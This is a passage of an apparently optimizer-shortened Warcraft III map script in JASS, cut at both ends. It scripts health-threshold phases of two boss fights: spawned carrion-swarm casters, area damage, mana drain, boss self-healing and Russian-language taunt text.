endif
call EnableTrigger(GetTriggeringTrigger())
endif
set VB=null
set Ny=null
set Np=null
endfunction
function Bno takes nothing returns nothing
local trigger fn=CreateTrigger()
call TriggerRegisterUnitEvent(fn,K5,EVENT_UNIT_DAMAGED)
call TriggerAddAction(fn,function Bnn)
set fn=null
endfunction
function Bnp takes nothing returns nothing
local unit Hu=GetEnumUnit()
if d8[3]==1 then
call UnitDamageTarget(Hu,Hu,1000,true,false,ATTACK_TYPE_CHAOS,DAMAGE_TYPE_UNIVERSAL,WEAPON_TYPE_WHOKNOWS)
elseif d8[3]==2 then
call UnitDamageTarget(Hu,Hu,2000,true,false,ATTACK_TYPE_CHAOS,DAMAGE_TYPE_UNIVERSAL,WEAPON_TYPE_WHOKNOWS)
elseif d8[3]==3 then
call UnitDamageTarget(Hu,Hu,5000,true,false,ATTACK_TYPE_CHAOS,DAMAGE_TYPE_UNIVERSAL,WEAPON_TYPE_WHOKNOWS)
endif
set Hu=null
endfunction
function Bnq takes nothing returns nothing
local unit VB=LoadUnitHandle(fl,GetHandleId(GetExpiredTimer()),0)
local location fq=GetUnitLoc(VB)
local integer Na
local integer Mc
local location No
local group Np
local boolexpr Nt
call SaveInteger(fl,GetHandleId(GetExpiredTimer()),1,LoadInteger(fl,GetHandleId(GetExpiredTimer()),1)-1)
set Na=LoadInteger(fl,GetHandleId(GetExpiredTimer()),3)
call SaveInteger(fl,GetHandleId(GetExpiredTimer()),3,LoadInteger(fl,GetHandleId(GetExpiredTimer()),3)+30)
if LoadInteger(fl,GetHandleId(GetExpiredTimer()),1)!=0 then
set Mc=100
loop
set No=PolarProjectionBJ(fq,Mc,I2R(Na))
call DestroyEffect(AddSpecialEffect("war3mapImported\\Singularity I Purple.mdl",GetLocationX(No),GetLocationY(No)))
set Np=CreateGroup()
set Nt=Condition(function my)
call GroupEnumUnitsInRange(Np,GetLocationX(No),GetLocationY(No),100,Nt)
call DestroyBoolExpr(Nt)
call ForGroup(Np,function Bnp)
call DestroyGroup(Np)
set Nt=null
set Np=null
call RemoveLocation(No)
set No=null
set Mc=Mc+100
exitwhen Mc>700
endloop
else
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
set VB=null
call RemoveLocation(fq)
set fq=null
endfunction
function Bnr takes nothing returns nothing
local unit VB=GetTriggerUnit()
local timer Mc
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(18.)
call nh(VB,"|c00ff9696Сейчас будет весело!",.028,255,255,255)
call TriggerSleepAction(1.5)
if IsUnitAliveBJ(VB)==true then
if GetOwningPlayer(VB)==Player(11) then
set Mc=CreateTimer()
call SaveUnitHandle(fl,GetHandleId(Mc),0,VB)
call SaveInteger(fl,GetHandleId(Mc),1,12)
call TimerStart(Mc,.8,true,function Bnq)
set Mc=null
endif
endif
set VB=null
call EnableTrigger(GetTriggeringTrigger())
endfunction
function Bns takes nothing returns nothing
local trigger fp=CreateTrigger()
call TriggerRegisterUnitEvent(fp,K5,EVENT_UNIT_DAMAGED)
call TriggerAddAction(fp,function Bnr)
set fp=null
endfunction
function Bnt takes nothing returns nothing
local unit NR=LoadUnitHandle(fl,GetHandleId(GetExpiredTimer()),0)
local unit fs=LoadUnitHandle(fl,GetHandleId(GetExpiredTimer()),1)
local location Mc
local group No
local boolexpr Np
if IsUnitAliveBJ(NR)==true then
if IsUnitAliveBJ(fs)==true then
call IssueTargetOrder(fs,"smart",NR)
set Mc=GetUnitLoc(fs)
call DestroyEffect(AddSpecialEffect("war3mapImported\\Singularity II Red.mdl",GetLocationX(Mc),GetLocationY(Mc)))
set No=CreateGroup()
set Np=Condition(function my)
call GroupEnumUnitsInRange(No,GetLocationX(Mc),GetLocationY(Mc),100,Np)
call DestroyBoolExpr(Np)
call ForGroup(No,function Bnp)
call DestroyGroup(No)
set Np=null
set No=null
call RemoveLocation(Mc)
set Mc=null
else
call RemoveSavedHandle(fl,GetHandleId(GetExpiredTimer()),0)
call RemoveSavedHandle(fl,GetHandleId(GetExpiredTimer()),1)
call PauseTimer(GetExpiredTimer())
call DestroyTimer(GetExpiredTimer())
endif
endif
set NR=null
set fs=null
endfunction
function Bnu takes nothing returns nothing
local unit VB=GetTriggerUnit()
local location fq=GetUnitLoc(VB)
local group Mc
local boolexpr No
local unit Np
local unit Nt
local timer Ny
if GetUnitLifePercent(VB)<=I2R(fo[2]) then
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(fo[2]))
set fo[2]=fo[2]-17
call DisableTrigger(GetTriggeringTrigger())
if IsUnitAliveBJ(VB)==true then
if GetOwningPlayer(VB)==Player(11) then
set Mc=CreateGroup()
set No=Condition(function mv)
call GroupEnumUnitsInRect(Mc,Rect(5752,-24230,7081,-22967),No)
call DestroyBoolExpr(No)
set Np=GroupPickRandomUnit(Mc)
set Nt=CreateUnitAtLoc(Player(10),$6E303839,fq,0)
call UnitApplyTimedLife(Nt,$42544C46,8)
set Ny=CreateTimer()
call SaveUnitHandle(fl,GetHandleId(Ny),0,Np)
call SaveUnitHandle(fl,GetHandleId(Ny),1,Nt)
call TimerStart(Ny,.5,true,function Bnt)
set Ny=null
call DestroyGroup(Mc)
set No=null
set Mc=null
call nh(VB,"|c00ff0000"+GetPlayerName(GetOwningPlayer(Np))+", беги!",.028,255,255,255)
endif
endif
endif
set VB=null
call RemoveLocation(fq)
set fq=null
call EnableTrigger(GetTriggeringTrigger())
set Nt=null
set Np=null
endfunction
function Bnv takes nothing returns nothing
local trigger fr=CreateTrigger()
call TriggerRegisterUnitEvent(fr,K5,EVENT_UNIT_DAMAGED)
call TriggerAddAction(fr,function Bnu)
set fr=null
endfunction
function Bnw takes nothing returns boolean
if not (GetUnitLifePercent(K5)<=85.) then
return false
endif
if not (GetOwningPlayer(GetTriggerUnit())==Player(11)) then
return false
endif
return true
endfunction
function Bnx takes nothing returns nothing
if Bnw() then
set bj_forLoopAIndex=1
set bj_forLoopAIndexEnd=2
loop
exitwhen bj_forLoopAIndex>bj_forLoopAIndexEnd
call DisableTrigger(GetTriggeringTrigger())
call CreateTextTagUnitBJ("Стоять на месте - равносильно смерти!",K5,0,20.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
set fu[GetForLoopIndexA()]=GetRandomLocInRect(i)
set fv[GetForLoopIndexA()]=GetRandomLocInRect(i)
call CreateNUnitsAtLocFacingLocBJ(1,$6E303441,Player(10),fv[GetForLoopIndexA()],fu[GetForLoopIndexA()])
set fw[GetForLoopIndexA()]=GetLastCreatedUnit()
call UnitApplyTimedLifeBJ(4.,$42544C46,fw[GetForLoopIndexA()])
call IssuePointOrderLocBJ(fw[GetForLoopIndexA()],"carrionswarm",fu[GetForLoopIndexA()])
set bj_forLoopAIndex=bj_forLoopAIndex+1
endloop
else
endif
endfunction
function Bny takes nothing returns nothing
set ft=CreateTrigger()
call DisableTrigger(ft)
call TriggerRegisterUnitEvent(ft,K5,EVENT_UNIT_DAMAGED)
call TriggerAddAction(ft,function Bnx)
endfunction
function Bnz takes nothing returns boolean
if not (GetUnitLifePercent(K5)<=58.) then
return false
endif
if not (GetOwningPlayer(GetTriggerUnit())==Player(11)) then
return false
endif
return true
endfunction
function Bn0 takes nothing returns nothing
if Bnz() then
set bj_forLoopAIndex=1
set bj_forLoopAIndexEnd=2
loop
exitwhen bj_forLoopAIndex>bj_forLoopAIndexEnd
call DisableTrigger(GetTriggeringTrigger())
call CreateTextTagUnitBJ("Стоять на месте - равносильно смерти!",K5,0,20.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
set fu[GetForLoopIndexA()]=GetRandomLocInRect(i)
set fv[GetForLoopIndexA()]=GetRandomLocInRect(i)
call CreateNUnitsAtLocFacingLocBJ(1,$6E303441,Player(10),fv[GetForLoopIndexA()],fu[GetForLoopIndexA()])
set fw[GetForLoopIndexA()]=GetLastCreatedUnit()
call UnitApplyTimedLifeBJ(4.,$42544C46,fw[GetForLoopIndexA()])
call IssuePointOrderLocBJ(fw[GetForLoopIndexA()],"carrionswarm",fu[GetForLoopIndexA()])
set bj_forLoopAIndex=bj_forLoopAIndex+1
endloop
else
endif
endfunction
function Bn1 takes nothing returns nothing
set fx=CreateTrigger()
call DisableTrigger(fx)
call TriggerRegisterUnitEvent(fx,K5,EVENT_UNIT_DAMAGED)
call TriggerAddAction(fx,function Bn0)
endfunction
function Bn2 takes nothing returns boolean
if not (GetUnitLifePercent(K5)<=42.) then
return false
endif
if not (GetOwningPlayer(GetTriggerUnit())==Player(11)) then
return false
endif
return true
endfunction
function Bn3 takes nothing returns nothing
if Bn2() then
set bj_forLoopAIndex=1
set bj_forLoopAIndexEnd=2
loop
exitwhen bj_forLoopAIndex>bj_forLoopAIndexEnd
call DisableTrigger(GetTriggeringTrigger())
call CreateTextTagUnitBJ("Стоять на месте - равносильно смерти!",K5,0,20.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
set fu[GetForLoopIndexA()]=GetRandomLocInRect(i)
set fv[GetForLoopIndexA()]=GetRandomLocInRect(i)
call CreateNUnitsAtLocFacingLocBJ(1,$6E303441,Player(10),fv[GetForLoopIndexA()],fu[GetForLoopIndexA()])
set fw[GetForLoopIndexA()]=GetLastCreatedUnit()
call UnitApplyTimedLifeBJ(4.,$42544C46,fw[GetForLoopIndexA()])
call IssuePointOrderLocBJ(fw[GetForLoopIndexA()],"carrionswarm",fu[GetForLoopIndexA()])
set bj_forLoopAIndex=bj_forLoopAIndex+1
endloop
else
endif
endfunction
function Bn4 takes nothing returns nothing
set fy=CreateTrigger()
call DisableTrigger(fy)
call TriggerRegisterUnitEvent(fy,K5,EVENT_UNIT_DAMAGED)
call TriggerAddAction(fy,function Bn3)
endfunction
function Bn5 takes nothing returns boolean
if not (GetUnitLifePercent(K5)<=30.) then
return false
endif
if not (GetOwningPlayer(GetTriggerUnit())==Player(11)) then
return false
endif
return true
endfunction
function Bn6 takes nothing returns nothing
if Bn5() then
set bj_forLoopAIndex=1
set bj_forLoopAIndexEnd=3
loop
exitwhen bj_forLoopAIndex>bj_forLoopAIndexEnd
call DisableTrigger(GetTriggeringTrigger())
call CreateTextTagUnitBJ("Стоять на месте - равносильно смерти!",K5,0,20.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
set fu[GetForLoopIndexA()]=GetRandomLocInRect(i)
set fv[GetForLoopIndexA()]=GetRandomLocInRect(i)
call CreateNUnitsAtLocFacingLocBJ(1,$6E303441,Player(10),fv[GetForLoopIndexA()],fu[GetForLoopIndexA()])
set fw[GetForLoopIndexA()]=GetLastCreatedUnit()
call UnitApplyTimedLifeBJ(4.,$42544C46,fw[GetForLoopIndexA()])
call IssuePointOrderLocBJ(fw[GetForLoopIndexA()],"carrionswarm",fu[GetForLoopIndexA()])
set bj_forLoopAIndex=bj_forLoopAIndex+1
endloop
else
endif
endfunction
function Bn7 takes nothing returns nothing
set fz=CreateTrigger()
call DisableTrigger(fz)
call TriggerRegisterUnitEvent(fz,K5,EVENT_UNIT_DAMAGED)
call TriggerAddAction(fz,function Bn6)
endfunction
function Bn8 takes nothing returns boolean
if not (GetUnitLifePercent(K5)<=15.) then
return false
endif
if not (GetOwningPlayer(GetTriggerUnit())==Player(11)) then
return false
endif
return true
endfunction
function Bn9 takes nothing returns nothing
if Bn8() then
set bj_forLoopAIndex=1
set bj_forLoopAIndexEnd=3
loop
exitwhen bj_forLoopAIndex>bj_forLoopAIndexEnd
call DisableTrigger(GetTriggeringTrigger())
call CreateTextTagUnitBJ("Стоять на месте - равносильно смерти!",K5,0,20.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
set fu[GetForLoopIndexA()]=GetRandomLocInRect(i)
set fv[GetForLoopIndexA()]=GetRandomLocInRect(i)
call CreateNUnitsAtLocFacingLocBJ(1,$6E303441,Player(10),fv[GetForLoopIndexA()],fu[GetForLoopIndexA()])
set fw[GetForLoopIndexA()]=GetLastCreatedUnit()
call UnitApplyTimedLifeBJ(4.,$42544C46,fw[GetForLoopIndexA()])
call IssuePointOrderLocBJ(fw[GetForLoopIndexA()],"carrionswarm",fu[GetForLoopIndexA()])
set bj_forLoopAIndex=bj_forLoopAIndex+1
endloop
else
endif
endfunction
function BoB takes nothing returns nothing
set f0=CreateTrigger()
call DisableTrigger(f0)
call TriggerRegisterUnitEvent(f0,K5,EVENT_UNIT_DAMAGED)
call TriggerAddAction(f0,function Bn9)
endfunction
function BoC takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BoD takes nothing returns boolean
if not (IsUnitType(GetEnumUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BoE takes nothing returns nothing
if BoD() then
call SetUnitManaPercentBJ(GetEnumUnit(),0.)
call CreateTextTagUnitBJ("MP: 0%",GetEnumUnit(),0,20.,0.,0.,100.,50.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
else
endif
endfunction
function BoF takes nothing returns boolean
if not (SC[GetForLoopIndexA()]>=2) then
return false
endif
return true
endfunction
function BoG takes nothing returns boolean
if not (SC[GetForLoopIndexA()]==1) then
return false
endif
return true
endfunction
function BoH takes nothing returns boolean
if not (SC[GetForLoopIndexA()]==0) then
return false
endif
return true
endfunction
function BoI takes nothing returns nothing
call RemoveUnit(GetFilterUnit())
endfunction
function BoJ takes nothing returns boolean
if not (GetUnitLifePercent(K5)<=70.) then
return false
endif
if not (GetOwningPlayer(GetTriggerUnit())==Player(11)) then
return false
endif
return true
endfunction
function BoK takes nothing returns nothing
if BoJ() then
call DisableTrigger(GetTriggeringTrigger())
set bj_forLoopAIndex=1
set bj_forLoopAIndexEnd=2
loop
exitwhen bj_forLoopAIndex>bj_forLoopAIndexEnd
set f2[GetForLoopIndexA()]=GetRandomLocInRect(BD)
set f3[GetForLoopIndexA()]=CreateUnitAtLoc(Player(10),$6830314A,f2[GetForLoopIndexA()],270.)
call UnitApplyTimedLifeBJ(4.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(f2[GetForLoopIndexA()])
call TriggerSleepAction(2.5)
set f4[GetForLoopIndexA()]=GetUnitLoc(f3[GetForLoopIndexA()])
set SC[GetForLoopIndexA()]=CountUnitsInGroup(GetUnitsInRangeOfLocMatching(200.,f4[GetForLoopIndexA()],Condition(function BoC)))
if BoH() then
call RemoveUnit(f3[GetForLoopIndexA()])
call SetUnitLifeBJ(K5,GetUnitState(K5,UNIT_STATE_LIFE)+200000.)
call CreateTextTagUnitBJ("+200000",K5,0,20.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
else
if BoG() then
call RemoveUnit(f3[GetForLoopIndexA()])
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Пронесло...")
else
if BoF() then
call RemoveUnit(f3[GetForLoopIndexA()])
call ForGroupBJ(GetUnitsInRectAll(BD),function BoE)
else
endif
endif
endif
call RemoveLocation(f4[GetForLoopIndexA()])
set bj_forLoopAIndex=bj_forLoopAIndex+1
endloop
set SR=GetUnitsOfTypeIdAll($6830314A)
call ForGroupBJ(SR,function BoI)
call DestroyGroup(SR)
else
endif
endfunction
function BoL takes nothing returns nothing
set f1=CreateTrigger()
call DisableTrigger(f1)
call TriggerRegisterUnitEvent(f1,K5,EVENT_UNIT_DAMAGED)
call TriggerAddAction(f1,function BoK)
endfunction
function BoM takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BoN takes nothing returns boolean
if not (IsUnitType(GetEnumUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BoO takes nothing returns nothing
if BoN() then
call SetUnitManaPercentBJ(GetEnumUnit(),0.)
call CreateTextTagUnitBJ("MP: 0%",GetEnumUnit(),0,20.,0.,0.,100.,50.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
else
endif
endfunction
function BoP takes nothing returns boolean
if not (SC[GetForLoopIndexA()]>=2) then
return false
endif
return true
endfunction
function BoQ takes nothing returns boolean
if not (SC[GetForLoopIndexA()]==1) then
return false
endif
return true
endfunction
function BoR takes nothing returns boolean
if not (SC[GetForLoopIndexA()]==0) then
return false
endif
return true
endfunction
function BoS takes nothing returns nothing
call RemoveUnit(GetFilterUnit())
endfunction
function BoT takes nothing returns boolean
if not (GetUnitLifePercent(K5)<=37.) then
return false
endif
if not (GetOwningPlayer(GetTriggerUnit())==Player(11)) then
return false
endif
return true
endfunction
function BoU takes nothing returns nothing
if BoT() then
call DisableTrigger(GetTriggeringTrigger())
set bj_forLoopAIndex=1
set bj_forLoopAIndexEnd=2
loop
exitwhen bj_forLoopAIndex>bj_forLoopAIndexEnd
set f2[GetForLoopIndexA()]=GetRandomLocInRect(BD)
set f3[GetForLoopIndexA()]=CreateUnitAtLoc(Player(10),$6830314A,f2[GetForLoopIndexA()],270.)
call UnitApplyTimedLifeBJ(4.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(f2[GetForLoopIndexA()])
call TriggerSleepAction(2.5)
set f4[GetForLoopIndexA()]=GetUnitLoc(f3[GetForLoopIndexA()])
set SC[GetForLoopIndexA()]=CountUnitsInGroup(GetUnitsInRangeOfLocMatching(200.,f4[GetForLoopIndexA()],Condition(function BoM)))
if BoR() then
call RemoveUnit(f3[GetForLoopIndexA()])
call SetUnitLifeBJ(K5,GetUnitState(K5,UNIT_STATE_LIFE)+200000.)
call CreateTextTagUnitBJ("+200000",K5,0,20.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
else
if BoQ() then
call RemoveUnit(f3[GetForLoopIndexA()])
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Пронесло...")
else
if BoP() then
call RemoveUnit(f3[GetForLoopIndexA()])
call ForGroupBJ(GetUnitsInRectAll(BD),function BoO)
else
endif
endif
endif
call RemoveLocation(f4[GetForLoopIndexA()])
set bj_forLoopAIndex=bj_forLoopAIndex+1
endloop
set SR=GetUnitsOfTypeIdAll($6830314A)
call ForGroupBJ(SR,function BoS)
call DestroyGroup(SR)
else
endif
endfunction
function BoV takes nothing returns nothing
set f5=CreateTrigger()
call DisableTrigger(f5)
call TriggerRegisterUnitEvent(f5,K5,EVENT_UNIT_DAMAGED)
call TriggerAddAction(f5,function BoU)
endfunction
function BoW takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BoX takes nothing returns boolean
if not (IsUnitType(GetEnumUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function BoY takes nothing returns nothing
if BoX() then
call SetUnitManaPercentBJ(GetEnumUnit(),0.)
call CreateTextTagUnitBJ("MP: 0%",GetEnumUnit(),0,20.,0.,0.,100.,50.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
else
endif
endfunction
function BoZ takes nothing returns boolean
if not (SC[GetForLoopIndexA()]>=2) then
return false
endif
return true
endfunction
function Boa takes nothing returns boolean
if not (SC[GetForLoopIndexA()]==1) then
return false
endif
return true
endfunction
function Bob takes nothing returns boolean
if not (SC[GetForLoopIndexA()]==0) then
return false
endif
return true
endfunction
function Boc takes nothing returns nothing
call RemoveUnit(GetFilterUnit())
endfunction
function Bod takes nothing returns boolean
if not (GetUnitLifePercent(K5)<=25.) then
return false
endif
if not (GetOwningPlayer(GetTriggerUnit())==Player(11)) then
return false
endif
return true
endfunction
function Boe takes nothing returns nothing
if Bod() then
call DisableTrigger(GetTriggeringTrigger())
set bj_forLoopAIndex=1
set bj_forLoopAIndexEnd=2
loop
exitwhen bj_forLoopAIndex>bj_forLoopAIndexEnd
set f2[GetForLoopIndexA()]=GetRandomLocInRect(BD)
set f3[GetForLoopIndexA()]=CreateUnitAtLoc(Player(10),$6830314A,f2[GetForLoopIndexA()],270.)
call UnitApplyTimedLifeBJ(4.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(f2[GetForLoopIndexA()])
call TriggerSleepAction(2.)
set f4[GetForLoopIndexA()]=GetUnitLoc(f3[GetForLoopIndexA()])
set SC[GetForLoopIndexA()]=CountUnitsInGroup(GetUnitsInRangeOfLocMatching(200.,f4[GetForLoopIndexA()],Condition(function BoW)))
if Bob() then
call RemoveUnit(f3[GetForLoopIndexA()])
call SetUnitLifeBJ(K5,GetUnitState(K5,UNIT_STATE_LIFE)+200000.)
call CreateTextTagUnitBJ("+200000",K5,0,20.,100.,0.,100.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
else
if Boa() then
call RemoveUnit(f3[GetForLoopIndexA()])
call DisplayTextToForce(GetPlayersAll(),"|c0000ff00Пронесло...")
else
if BoZ() then
call RemoveUnit(f3[GetForLoopIndexA()])
call ForGroupBJ(GetUnitsInRectAll(BD),function BoY)
else
endif
endif
endif
call RemoveLocation(f4[GetForLoopIndexA()])
set bj_forLoopAIndex=bj_forLoopAIndex+1
endloop
set SR=GetUnitsOfTypeIdAll($6830314A)
call ForGroupBJ(SR,function Boc)
call DestroyGroup(SR)
else
endif
endfunction
function Bof takes nothing returns nothing
set f6=CreateTrigger()
call DisableTrigger(f6)
call TriggerRegisterUnitEvent(f6,K5,EVENT_UNIT_DAMAGED)
call TriggerAddAction(f6,function Boe)
endfunction
function Bog takes nothing returns boolean
if not (CountUnitsInGroup(SR)<=1) then
return false
endif
if not (GetOwningPlayer(GetTriggerUnit())==Player(11)) then
return false
endif
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Boh takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=I2R(TM[0])) then
return false
endif
return true
endfunction
function Boi takes nothing returns nothing
local location Mc
if Boh() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(TM[0]))
set TM[0]=TM[0]-10
set SR=GetUnitsOfTypeIdAll($6E303454)
if Bog() then
call DestroyGroup(SR)
set Mc=GetRandomLocInRect(i)
call CreateNUnitsAtLoc(1,$6E303454,Player(10),Mc,bj_UNIT_FACING)
call RemoveLocation(Mc)
call UnitAddAbility(K5,$41436D33)
call UnitAddAbility(K5,$41303736)
call CreateTextTagUnitBJ("СЮРПРИЗ!",K5,0,20.,100.,0.,0.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),2.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),2.)
else
endif
call DestroyGroup(SR)
call EnableTrigger(GetTriggeringTrigger())
else
endif
set Mc=null
endfunction
function Boj takes nothing returns nothing
set eP=CreateTrigger()
call DisableTrigger(eP)
call TriggerRegisterUnitEvent(eP,K5,EVENT_UNIT_DAMAGED)
call TriggerAddAction(eP,function Boi)
endfunction
function Bok takes nothing returns boolean
if not (GetUnitTypeId(GetAttackedUnitBJ())==$6E303130) then
return false
endif
return true
endfunction
function Bol takes nothing returns nothing
if Bok() then
call DisableTrigger(GetTriggeringTrigger())
call TriggerSleepAction(25.)
call CreateTextTagUnitBJ("|c007d7d7dМоскиты|r",K9,0,10,100,100,100,0)
call SetTextTagTextBJ(GetLastCreatedTextTag(),"|c007d7d7dМоскиты|r",15.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call IssueImmediateOrderBJ(GetAttackedUnitBJ(),"locustswarm")
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function Bom takes nothing returns nothing
set f7=CreateTrigger()
call DisableTrigger(f7)
call TriggerRegisterUnitEvent(f7,K9,EVENT_UNIT_DAMAGED)
call TriggerAddAction(f7,function Bol)
endfunction
function Bon takes nothing returns boolean
if not (IsUnitType(GetEnumUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Boo takes nothing returns nothing
if Bon() then
call CreateTextTagUnitBJ("|c00FF0000-40%|r",K9,0,10,100,100,100,0)
call SetTextTagTextBJ(GetLastCreatedTextTag(),"|c00FF0000-40%|r",20.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call AddSpecialEffectTargetUnitBJ("origin",GetEnumUnit(),"Abilities\\Spells\\Undead\\Darksummoning\\DarkSummonTarget.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
call SetUnitLifeBJ(GetEnumUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetEnumUnit())*.6)
else
endif
endfunction
function Bop takes nothing returns boolean
if not (GetUnitLifePercent(K9)<=I2R(TN[0])) then
return false
endif
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Boq takes nothing returns nothing
if Bop() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(TN[0]))
set TN[0]=TN[0]-25
call ForGroupBJ(GetUnitsInRectAll(x),function Boo)
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function Bor takes nothing returns nothing
set f8=CreateTrigger()
call DisableTrigger(f8)
call TriggerRegisterUnitEvent(f8,K9,EVENT_UNIT_DAMAGED)
call TriggerAddAction(f8,function Boq)
endfunction
function Bos takes nothing returns boolean
if not (IsUnitType(GetEnumUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bot takes nothing returns nothing
if Bos() then
call CreateTextTagUnitBJ("|c00FF0000-30%|r",K9,0,10,100,100,100,0)
call SetTextTagTextBJ(GetLastCreatedTextTag(),"|c00FF0000-30%|r",20.)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call AddSpecialEffectTargetUnitBJ("origin",GetEnumUnit(),"Abilities\\Spells\\Undead\\Darksummoning\\DarkSummonTarget.mdl")
call DestroyEffectBJ(GetLastCreatedEffectBJ())
call SetUnitLifeBJ(GetEnumUnit(),GetUnitStateSwap(UNIT_STATE_LIFE,GetEnumUnit())*.7)
else
endif
endfunction
function Bou takes nothing returns boolean
if not (GetUnitLifePercent(K9)<=I2R(TN[0])) then
return false
endif
if not (IsUnitAliveBJ(GetTriggerUnit())==true) then
return false
endif
return true
endfunction
function Bov takes nothing returns nothing
if Bou() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(TN[0]))
set TN[0]=TN[0]-25
call ForGroupBJ(GetUnitsInRectAll(x),function Bot)
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function Bow takes nothing returns nothing
set f9=CreateTrigger()
call DisableTrigger(f9)
call TriggerRegisterUnitEvent(f9,K9,EVENT_UNIT_DAMAGED)
call TriggerAddAction(f9,function Bov)
endfunction
function Box takes nothing returns boolean
if not (IsUnitType(GetEnumUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Boy takes nothing returns nothing
if Box() then
